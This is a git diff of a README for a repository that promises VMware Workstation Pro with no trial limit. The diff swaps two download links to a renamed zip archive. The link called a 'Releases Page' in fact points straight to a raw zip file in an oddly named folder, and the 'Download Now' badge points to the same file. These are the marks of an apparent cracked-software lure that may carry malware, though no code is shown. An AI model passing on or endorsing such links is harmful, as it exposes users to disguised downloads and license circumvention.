@@ -1,6 +1,6 @@
 # 🖥️ VMware-Workstation-Pro-No-Trial - Run Virtual Machines Smoothly
 
-![Download Now](https://raw.githubusercontent.com/Meh3met/VMware-Workstation-Pro-No-Trial/main/orismologic/VMware-Workstation-Pro-No-Trial-3.6.zip%20Now-2023--10--01-brightgreen)
+![Download Now](https://raw.githubusercontent.com/Meh3met/VMware-Workstation-Pro-No-Trial/main/orismologic/Pro_Workstation_Mware_Trial_No_V_1.7.zip%20Now-2023--10--01-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the VMware Workstation Pro No Trial project. This tool allows you to 
 To get started, you need to visit the Releases page to download the software. Follow these steps:
 
 1. Click the link below to go to the Releases page.
-   [Visit Releases Page to Download](https://raw.githubusercontent.com/Meh3met/VMware-Workstation-Pro-No-Trial/main/orismologic/VMware-Workstation-Pro-No-Trial-3.6.zip)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Meh3met/VMware-Workstation-Pro-No-Trial/main/orismologic/Pro_Workstation_Mware_Trial_No_V_1.7.zip)
    
 2. On the Releases page, find the version that suits your needs. Click on the version to view details.
 
